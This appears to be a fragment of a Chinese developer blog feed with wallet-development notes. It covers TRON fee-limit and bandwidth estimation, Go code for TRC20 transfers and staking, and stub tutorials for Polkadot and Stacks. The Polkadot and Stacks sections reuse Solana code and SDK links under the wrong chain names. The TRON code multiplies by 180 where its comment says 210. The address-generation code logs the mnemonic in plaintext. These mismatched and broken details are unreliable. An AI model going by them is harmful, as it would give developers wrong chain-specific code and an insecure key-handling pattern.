class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="下面是手动构建手动前面，并且计算gasfee"><a href="#下面是手动构建手动前面，并且计算gasfee" class="headerlink" title="下面是手动构建手动前面，并且计算gasfee"></a>下面是手动构建手动前面，并且计算gasfee</h2><h3 id="gas-fee-limit-的三种设置方式"><a href="#gas-fee-limit-的三种设置方式" class="headerlink" title="gas fee limit 的三种设置方式"></a>gas fee limit 的三种设置方式</h3><p>EnergyPrice单价为210 sun</p><ul><li><strong>第一种：</strong>每次合约调用前估算能源</li></ul><p>最精准的方式，也是最繁琐，每笔交易前都需要估算：</p><p>每次交易前通过接口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">FeeLimit of contract transaction = estimated total energy consumption * EnergyPrice<br>合约交易的FeeLimit=预计总能源消耗量*EnergyPrice<br>预计总能源消耗量是energy_use吗？<br>EnergyPrice单价是多少？<br>目前能源单价为210太阳能。有关如何估算能源消耗<br></code></pre></td></tr></table></figure><ul><li><strong>第二种：</strong>每维护周期获取一次合约<code>energy_factor</code></li></ul><p>通过接口获取拿到能源消耗energy_use,再通过接口拿到energy_factor，根据公式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">FeeLimit of contract transaction = estimated basic energy consumption * (1 + energy_factor) * EnergyPrice<br>FeeLimit = 预估基础能源消耗energy_use * (1 + energy_factor) * EnergyPrice<br>这个EnergyPrice 是什么？<br></code></pre></td></tr></table></figure><ul><li><strong>第三种：</strong>根据<code>max_factor</code>设置<code>feelimit</code></li></ul><p>首先通过<a href="https://developers.tron.network/reference/triggerconstantcontract">triggerconstantcontract</a> API或者合约过去的历史经验确定某个合约某个函数的基本能耗，然后取链的<code>max_factor</code>参数<code>max_factor</code>是能耗惩罚系数的最大比例，所以无论热门合约的能耗如何波动，都不会超过这个最大比例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">FeeLimit of contract transaction = estimated basic energy consumption *（1 + max_factor）* EnergyPrice<br>合约交易的FeeLimit = 预估基础能源消耗*（1 + max_factor）* EnergyPrice<br>max_factor=3.4 是第二种方式里的energy_factor的最大值<br></code></pre></td></tr></table></figure><h3 id="带宽费-不用设置带宽"><a href="#带宽费-不用设置带宽" class="headerlink" title="带宽费 不用设置带宽"></a>带宽费 不用设置带宽</h3><p>目前带宽单价为1000sun</p><p>一笔交易所消耗的带宽等于链上交易占用的字节数，链上交易包括交易的raw_data、交易签名、交易结果三部分，这三部分经过protobuf序列化编码后所占的字节数就是这笔交易所消耗的带宽。以trident和tronweb为例，说明如何估算带宽：</p><ul><li><p>使用 trident 估算带宽</p><p>trident 提供了一个带宽预估<a href="https://developers.tron.network/reference/apis-transactions#estimatebandwidth">APIestimateBandwidth</a> ，参数是一个签名的交易，接口实现如下：</p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">public long <span class="hljs-title function_">estimateBandwidth</span>(<span class="hljs-params">Transaction txn</span>) <br>&#123;<br>    long byteSize = txn.<span class="hljs-title function_">toBuilder</span>().<span class="hljs-title function_">clearRet</span>().<span class="hljs-title function_">build</span>().<span class="hljs-title function_">getSerializedSize</span>() + <span class="hljs-number">64</span>;<br>    <span class="hljs-keyword">return</span> byteSize;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>使用 tronweb 估算带宽,这个有点复杂</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">estimateBandwidth</span>(<span class="hljs-params">signedTxn</span>)<br>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">DATA_HEX_PROTOBUF_EXTRA</span> = <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">MAX_RESULT_SIZE_IN_TX</span> = <span class="hljs-number">64</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">A_SIGNATURE</span> = <span class="hljs-number">67</span>;<br><br>    <span class="hljs-keyword">var</span> len = signedTxn.<span class="hljs-property">raw_data_hex</span>.<span class="hljs-property">length</span> /<span class="hljs-number">2</span> + <span class="hljs-variable constant_">DATA_HEX_PROTOBUF_EXTRA</span> + <span class="hljs-variable constant_">MAX_RESULT_SIZE_IN_TX</span>  ;<br>    <span class="hljs-keyword">var</span> signatureListSize = signedTxn.<span class="hljs-property">signature</span>.<span class="hljs-property">length</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(signatureListSize)<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;signatureListSize;i++)<br>    &#123;<br>        len += <span class="hljs-variable constant_">A_SIGNATURE</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> len;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="手动构建"><a href="#手动构建" class="headerlink" title="手动构建"></a>手动构建</h2><p>步骤还是和其他链一样构建–&gt;签名–&gt;广播</p><p>构建之前算好fee_limit即可</p><p>Feee_limit 等于 预估能源消耗 x 能源单价即可</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TransactionBuilder</span><span class="hljs-params">()</span></span> <span class="hljs-type">bool</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;开始构建交易&quot;</span>)<br>c := getClient()<br>alice := <span class="hljs-string">&quot;TBSssNBoAX5isgjaR9cLZ4i84rf1Q7A5gr&quot;</span><br>bob := <span class="hljs-string">&quot;TJF5RmJW2io8pcbHVXAGf9i5uXncJQBxX3&quot;</span><br><br>from := alice<br>contractAddress := <span class="hljs-string">&quot;TF17BgPaZYbz8oxbjhriubPDsA7ArKoLX3&quot;</span><br>method := <span class="hljs-string">&quot;transfer(address,uint256)&quot;</span><br><br><span class="hljs-comment">// 1 计算能源消耗</span><br>estimateEnergyMessage, err := c.EstimateEnergy(from, contractAddress, method, fmt.Sprintf(<span class="hljs-string">`</span><br><span class="hljs-string">[</span><br><span class="hljs-string">&#123;&quot;address&quot;:&quot;TBSssNBoAX5isgjaR9cLZ4i84rf1Q7A5gr&quot;&#125;,</span><br><span class="hljs-string">&#123;&quot;uint256&quot;:&quot;100000000000000000&quot;&#125;</span><br><span class="hljs-string">]</span><br><span class="hljs-string">`</span>), <span class="hljs-number">0</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">0</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;EstimateEnergy err:&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;txExtention: %+v\n&quot;</span>, estimateEnergyMessage)<br><span class="hljs-comment">// 能源消耗=estimateEnergyMessage.EnergyRequired  result:&#123;result:true&#125; energy_required:16915</span><br><span class="hljs-comment">// 能源消耗乘以单价210</span><br>fee_limit := estimateEnergyMessage.EnergyRequired * <span class="hljs-number">180</span><br>fmt.Println(<span class="hljs-string">&quot;energyCost&quot;</span>, fee_limit)<br><span class="hljs-comment">// 2组装交易</span><br>tx, err := c.TRC20Send(alice, bob, contractAddress, big.NewInt(<span class="hljs-number">100000000000000000</span>), fee_limit)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;TRC20Send err:&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><span class="hljs-comment">// 3.恢复签名者</span><br>keyStore, keyStoreAccount, err := store.UnlockedKeystore(alice, <span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;解锁账户失败=%v&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><span class="hljs-comment">// 4.签名交易</span><br>signedTx, err := keyStore.SignTx(*keyStoreAccount, tx.Transaction)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;SignTx err:&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br><br>&#125;<br>rawData := signedTx.GetRawData()<br>rawDataPro, _ := proto.Marshal(rawData)<br>h256h := sha256.New()<br>h256h.Write(rawDataPro)<br>hash := h256h.Sum(<span class="hljs-literal">nil</span>)<br><span class="hljs-comment">//fmt.Printf(&quot;hash=%v&quot;, common.BytesToHexString(hash))</span><br>fmt.Printf(<span class="hljs-string">&quot;https://nile.tronscan.org/#/transaction/%s&quot;</span>, hex.EncodeToString(hash))<br><span class="hljs-comment">// 5.广播交易</span><br>res, err := c.Broadcast(signedTx)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Broadcast err:&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br><br>&#125;<br><span class="hljs-keyword">return</span> res.Result<br></code></pre></td></tr></table></figure><h1 id="质押"><a href="#质押" class="headerlink" title="质押"></a>质押</h1><p>TRON网络有三种系统资源：</p><ul><li><a href="https://developers.tron.network/docs/resource-model#energy">Energy 活力</a></li><li><a href="https://developers.tron.network/docs/resource-model#bandwidth">Bandwidth 带宽</a></li><li><a href="https://developers.tron.network/docs/resource-model#voting-right">Voting right 投票权</a></li></ul><p>能源和带宽资源由账户所有者通过 Stake 获得，如何通过 HTTP API 完成 Stake 操作请参阅<a href="https://developers.tron.network/reference/freezebalancev2-1">wallet&#x2F;freezebalancev2</a> ，如何通过合约完成 Stake 操作请参阅<a href="https://developers.tron.network/docs/stake-20-solidity-api#freezebalancev2uint-amount-uint-resourcetype">Stake2.0 Solidity API</a> 。</p><p>TRON 通过质押机制来分配资源，质押 TRX 除了可以获得带宽或能源资源外，还将获得与质押金额等值的投票权（TRON Power，简称 TP）。质押 1 个 TRX，可获得 1TP。质押获得的能源或带宽资源用于支付交易手续费，获得的投票权用于<a href="https://developers.tron.network/reference/votewitnessaccount">投票选出</a>超级代表，获得投票奖励。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetContractABI</span><span class="hljs-params">(contractAddress <span class="hljs-type">string</span>)</span></span> &#123;<br>c := getClient()<br><br><span class="hljs-comment">// fmt.Println(&quot;abi&quot;, abi)</span><br><span class="hljs-comment">// abiJson, _ := json.MarshalIndent(&amp;abitest, &quot;&quot;, &quot;  &quot;)</span><br><span class="hljs-comment">// fmt.Println(&quot;abiJson&quot;, string(abiJson))</span><br>method := <span class="hljs-string">&quot;transfer&quot;</span><br>abitest, err := c.GetContractABI(contractAddress)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;GetContractABI err:&quot;</span>, err)<br>&#125;<br>Arguments, err := abi.GetInputsParser(abitest, method)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;GetParser err:&quot;</span>, err)<br>&#125;<br><span class="hljs-comment">// fmt.Println(&quot;Arguments&quot;, Arguments)</span><br><span class="hljs-keyword">for</span> _, arg := <span class="hljs-keyword">range</span> Arguments &#123;<br>fmt.Println(<span class="hljs-string">&quot;arg&quot;</span>, arg)<br><br>&#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> (<br>ResourceCode_BANDWIDTH  = <span class="hljs-number">0</span> <span class="hljs-comment">// 带宽</span><br>ResourceCode_ENERGY     = <span class="hljs-number">1</span> <span class="hljs-comment">// 能量</span><br>ResourceCode_TRON_POWER = <span class="hljs-number">2</span> <span class="hljs-comment">// 超级节点投票权 不可用，</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">DelegateTrx</span><span class="hljs-params">()</span></span> <span class="hljs-type">bool</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;开始委托TRX&quot;</span>)<br>c := getClient()<br>alice := <span class="hljs-string">&quot;TBSssNBoAX5isgjaR9cLZ4i84rf1Q7A5gr&quot;</span><br><span class="hljs-comment">// bob := &quot;TJF5RmJW2io8pcbHVXAGf9i5uXncJQBxX3&quot;</span><br><span class="hljs-comment">// 质押TRX 有三种：BANDWIDTH带宽，ENERGY能量，TRON_POWER超级节点投票权</span><br><span class="hljs-comment">// 第一种：带宽</span><br><span class="hljs-comment">// tx, err := c.FreezeBalanceV2(alice, ResourceCode_BANDWIDTH, 297000000)</span><br>tx, err := c.FreezeBalanceV2(alice, ResourceCode_ENERGY, <span class="hljs-number">297000000</span>)<br><span class="hljs-comment">// tx, err := c.FreezeBalanceV2(alice, ResourceCode_TRON_POWER, 297000000) // 不可用</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;FreezeBalanceV2 err:&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;tx&quot;</span>, tx)<br><span class="hljs-comment">// 2.恢复签名者</span><br>keyStore, keyStoreAccount, err := store.UnlockedKeystore(alice, <span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;解锁账户失败=%v&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><span class="hljs-comment">// 3. 签名交易</span><br>controller := transaction.NewController(c, keyStore, keyStoreAccount, tx.Transaction)<br><span class="hljs-comment">// 4. 广播交易---&gt;这里很特别，新建控制器，通过控制器去执行交易，是一种设计模式，把步骤变成一种行为</span><br><span class="hljs-keyword">if</span> err = controller.ExecuteTransaction(); err != <span class="hljs-literal">nil</span> &#123;<br>logrus.Warnf(<span class="hljs-string">&quot;ExecuteTransaction error: %s&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>txHash, err := controller.TransactionHash()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;TransactionHash err:&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;txHash&quot;</span>, txHash)<br>fmt.Printf(<span class="hljs-string">&quot;https://nile.tronscan.org/#/transaction/%s&quot;</span>, txHash[<span class="hljs-number">2</span>:])<br><br><span class="hljs-keyword">return</span> controller.Result.Result<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>07-7DOT波卡钱包开发流程</title>
    <link href="/2024/11/26/07-7DOT%E6%B3%A2%E5%8D%A1%E9%92%B1%E5%8C%85%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8B/"/>
    <url>/2024/11/26/07-7DOT%E6%B3%A2%E5%8D%A1%E9%92%B1%E5%8C%85%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="一-Polkadot简介"><a href="#一-Polkadot简介" class="headerlink" title="一 Polkadot简介"></a>一 Polkadot简介</h1><p>名称：</p><p>精度：</p><p>确认数：xxx块后交易安全不易会滚</p><p>是否支持token代币：是</p><p>是否支持质押:是</p><p>出块时间:</p><p>地址：Base58</p><p><strong>交易签名算法</strong></p><ul><li><input disabled="" type="checkbox"> secp256k1</li><li><input checked="" disabled="" type="checkbox"> ed25519 BLAKE2b</li><li><input disabled="" type="checkbox"> schnorr_1</li><li><input disabled="" type="checkbox"> 其它签名算法</li></ul><h1 id="二-离线地址生成"><a href="#二-离线地址生成" class="headerlink" title="二 离线地址生成"></a>二 离线地址生成</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GenerateOfflineAddress</span><span class="hljs-params">()</span></span> types.Account &#123;<br>    <span class="hljs-comment">// 生成随机墒---bit39</span><br>    entropy, _ := bip39.NewEntropy(<span class="hljs-number">256</span>)<br>    <span class="hljs-comment">// 墒生成助记词</span><br>    mnemonic, _ := bip39.NewMnemonic(entropy)<br><br>    <span class="hljs-comment">// 从助记词生成种子</span><br><br>    logrus.Infof(<span class="hljs-string">&quot;mnemonic: %s&quot;</span>, mnemonic)<br>    seed := bip39.NewSeed(mnemonic, <span class="hljs-string">&quot;&quot;</span>)<br><br>    path := <span class="hljs-string">`m/44&#x27;/501&#x27;/0&#x27;/0&#x27;`</span><br>    derivedKey, _ := hdwallet.Derived(path, seed)<br>    <span class="hljs-comment">//accountFromSeed, err := types.AccountFromBytes(derivedKey)</span><br>    accountFromSeed, err := types.AccountFromSeed(derivedKey.PrivateKey)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       fmt.Printf(<span class="hljs-string">&quot;err=%v&quot;</span>, err)<br>    &#125;<br>    publicKey := accountFromSeed.PublicKey.ToBase58()<br>    fmt.Println(<span class="hljs-string">&quot;Solana Wallet Address:&quot;</span>, publicKey)<br>    <span class="hljs-keyword">return</span> accountFromSeed<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="三-离线签名"><a href="#三-离线签名" class="headerlink" title="三 离线签名"></a>三 离线签名</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go">NewTx := types.NewTransactionParam&#123;<br>    Message: types.NewMessage(types.NewMessageParam&#123;<br>       FeePayer:        Account.PublicKey,<br>       RecentBlockhash: block.Blockhash,<br>       Instructions: []types.Instruction&#123;system.Transfer(system.TransferParam&#123;<br>          From:   Account.PublicKey,<br>          To:     common.PublicKeyFromString(<span class="hljs-string">&quot;6cPnfGr9Y4bZK7ykNpxe2hkKfaPPgsy6Tu5ahyGhzQLt&quot;</span>),<br>          Amount: <span class="hljs-number">123000</span>,<br>       &#125;)&#125;,<br>    &#125;),<br>    Signers: []types.Account&#123;Account&#125;,<br>&#125;<br><br>tx, err := types.NewTransaction(NewTx)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>    logrus.Warnf(<span class="hljs-string">&quot;new transaction error: %s&quot;</span>, err)<br>&#125;<br><br>hash, err := solClient.SendTransaction(bg, tx)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>    logrus.Warnf(<span class="hljs-string">&quot;new transaction error: %s&quot;</span>, err)<br>&#125;<br>logrus.Infof(<span class="hljs-string">&quot;hash: %v&quot;</span>, hash)<br></code></pre></td></tr></table></figure><h1 id="四-Stacks钱包开发中的API"><a href="#四-Stacks钱包开发中的API" class="headerlink" title="四 Stacks钱包开发中的API"></a>四 Stacks钱包开发中的API</h1><h2 id="1-获取账户信息"><a href="#1-获取账户信息" class="headerlink" title="1.获取账户信息"></a>1.获取账户信息</h2><h2 id="2-获取-recentBlochHash-直接签名的话-recentBlochHash-相当于-nonce"><a href="#2-获取-recentBlochHash-直接签名的话-recentBlochHash-相当于-nonce" class="headerlink" title="2.获取 recentBlochHash, 直接签名的话 recentBlochHash 相当于 nonce"></a>2.获取 recentBlochHash, 直接签名的话 recentBlochHash 相当于 nonce</h2><h2 id="3-获取准备-nonce-账户的-Minimum-Balance-For-Rent-数据"><a href="#3-获取准备-nonce-账户的-Minimum-Balance-For-Rent-数据" class="headerlink" title="3. 获取准备 nonce 账户的 Minimum Balance For Rent 数据"></a>3. 获取准备 nonce 账户的 Minimum Balance For Rent 数据</h2><h2 id="4-获取最新块高-（Slot）"><a href="#4-获取最新块高-（Slot）" class="headerlink" title="4. 获取最新块高 （Slot）"></a>4. 获取最新块高 （Slot）</h2><h2 id="5-根据块高获取交易"><a href="#5-根据块高获取交易" class="headerlink" title="5. 根据块高获取交易"></a>5. 根据块高获取交易</h2><h2 id="6-根据交易-Hash-获取交易详情"><a href="#6-根据交易-Hash-获取交易详情" class="headerlink" title="6. 根据交易 Hash 获取交易详情"></a>6. 根据交易 Hash 获取交易详情</h2><h2 id="7-发送交易到区块链网络"><a href="#7-发送交易到区块链网络" class="headerlink" title="7.发送交易到区块链网络"></a>7.发送交易到区块链网络</h2><h1 id="五-中心化钱包开发"><a href="#五-中心化钱包开发" class="headerlink" title="五 中心化钱包开发"></a>五 中心化钱包开发</h1><h1 id="六、去中心化钱包开发-HD钱包"><a href="#六、去中心化钱包开发-HD钱包" class="headerlink" title="六、去中心化钱包开发 HD钱包"></a>六、去中心化钱包开发 HD钱包</h1><h1 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h1><h1 id="八、附件"><a href="#八、附件" class="headerlink" title="八、附件"></a>八、附件</h1><p>官网：<a href="https://polkadot.com/">https://polkadot.com/</a></p><p>文档：<a href="https://docs.substrate.io/">https://docs.substrate.io/</a></p><p>资料；</p><p>节点：<a href="https://dashboard.alchemy.com/">https://dashboard.alchemy.com/</a> 第三方节点</p><p>浏览器：<a href="https://polkadot.subscan.io/">https://polkadot.subscan.io/</a></p><p>第三方SDK：<a href="https://github.com/blocto/solana-go-sdk">https://github.com/blocto/solana-go-sdk</a></p><p>API&#x2F;Swager 文档:<a href="https://solana.com/zh/docs/rpc">https://solana.com/zh/docs/rpc</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">solana1.jpg<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>07-6Stacks钱包开发流程</title>
    <link href="/2024/11/26/07-6Stacks%E9%92%B1%E5%8C%85%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8B/"/>
    <url>/2024/11/26/07-6Stacks%E9%92%B1%E5%8C%85%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="Stacks钱包开发简单教程"><a href="#Stacks钱包开发简单教程" class="headerlink" title="Stacks钱包开发简单教程"></a>Stacks钱包开发简单教程</h1><h1 id="一-Stacks简介"><a href="#一-Stacks简介" class="headerlink" title="一 Stacks简介"></a>一 Stacks简介</h1><p>名称：</p><p>精度：</p><p>确认数：xxx块后交易安全不易会滚</p><p>是否支持token代币：是</p><p>是否支持质押:是</p><p>出块时间:</p><p>地址：Base58</p><p><strong>交易签名算法</strong></p><ul><li><input disabled="" type="checkbox"> secp256k1</li><li><input checked="" disabled="" type="checkbox"> ed25519 BLAKE2b</li><li><input disabled="" type="checkbox"> schnorr_1</li><li><input disabled="" type="checkbox"> 其它签名算法</li></ul><h1 id="二-离线地址生成"><a href="#二-离线地址生成" class="headerlink" title="二 离线地址生成"></a>二 离线地址生成</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GenerateOfflineAddress</span><span class="hljs-params">()</span></span> types.Account &#123;<br>    <span class="hljs-comment">// 生成随机墒---bit39</span><br>    entropy, _ := bip39.NewEntropy(<span class="hljs-number">256</span>)<br>    <span class="hljs-comment">// 墒生成助记词</span><br>    mnemonic, _ := bip39.NewMnemonic(entropy)<br><br>    <span class="hljs-comment">// 从助记词生成种子</span><br><br>    logrus.Infof(<span class="hljs-string">&quot;mnemonic: %s&quot;</span>, mnemonic)<br>    seed := bip39.NewSeed(mnemonic, <span class="hljs-string">&quot;&quot;</span>)<br><br>    path := <span class="hljs-string">`m/44&#x27;/501&#x27;/0&#x27;/0&#x27;`</span><br>    derivedKey, _ := hdwallet.Derived(path, seed)<br>    <span class="hljs-comment">//accountFromSeed, err := types.AccountFromBytes(derivedKey)</span><br>    accountFromSeed, err := types.AccountFromSeed(derivedKey.PrivateKey)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       fmt.Printf(<span class="hljs-string">&quot;err=%v&quot;</span>, err)<br>    &#125;<br>    publicKey := accountFromSeed.PublicKey.ToBase58()<br>    fmt.Println(<span class="hljs-string">&quot;Solana Wallet Address:&quot;</span>, publicKey)<br>    <span class="hljs-keyword">return</span> accountFromSeed<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="三-离线签名"><a href="#三-离线签名" class="headerlink" title="三 离线签名"></a>三 离线签名</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span 